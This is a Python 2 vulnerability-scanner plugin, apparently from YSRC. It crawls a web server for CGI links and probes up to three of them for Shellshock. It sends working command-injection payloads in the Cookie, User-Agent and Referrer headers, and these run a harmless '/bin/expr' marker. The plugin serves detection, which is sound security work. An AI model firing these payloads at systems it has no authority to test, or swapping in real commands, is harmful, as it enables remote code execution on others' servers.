# coding=utf-8
import urllib2
import re
import urlparse
import HTMLParser

def get_plugin_info():
    plugin_info = {
        "name": "shellshock破壳",
        "info": "攻击者可利用此漏洞改变或绕过环境限制，以执行任意的shell命令,最终完全控制目标系统",
        "level": "紧急",
        "type": "命令执行",
        "author": "wolf@YSRC",
        "url": "http://www.freebuf.com/articles/system/45390.html",
        "keyword": "server:web",
        "source": 1
    }
    return plugin_info


def get_url(domain, timeout):
    url_list = []
    res = urllib2.urlopen('http://' + domain, timeout=timeout)
    html = res.read()
    root_url = res.geturl()
    m = re.findall("<a[^>]*?href=('|\")(.*?)\\1", html, re.I)
    if m:
        for url in m:
            ParseResult = urlparse.urlparse(url[1])
            if ParseResult.netloc and ParseResult.scheme:
                if domain == ParseResult.hostname:
                    url_list.append(HTMLParser.HTMLParser().unescape(url[1]))
            elif not ParseResult.netloc and not ParseResult.scheme:
                url_list.append(HTMLParser.HTMLParser().unescape(urlparse.urljoin(root_url, url[1])))
    return list(set(url_list))


def check(ip, port, timeout):
    try:
        url_list = get_url(ip + ":" + str(port), timeout)
    except Exception, e:
        return
    try:
        flag_list = ['() { :; }; /bin/expr 32001611 - 100', '{() { _; } >_[$($())] { /bin/expr 32001611 - 100; }}']
        i = 0
        for url in url_list:
            if '.cgi' in url:
                i += 1
                if i >= 4: return
                for flag in flag_list:
                    header = {'cookie': flag, 'User-Agent': flag, 'Referrer': flag}
                    try:
                        request = urllib2.Request(url, headers=header)
                        res_html = urllib2.urlopen(request).read()
                    except urllib2.HTTPError, e:
                        res_html = e.read()
                    if "32001511" in res_html:
                        return u'shellshock命令执行漏洞'
    except Exception, e:
        pass

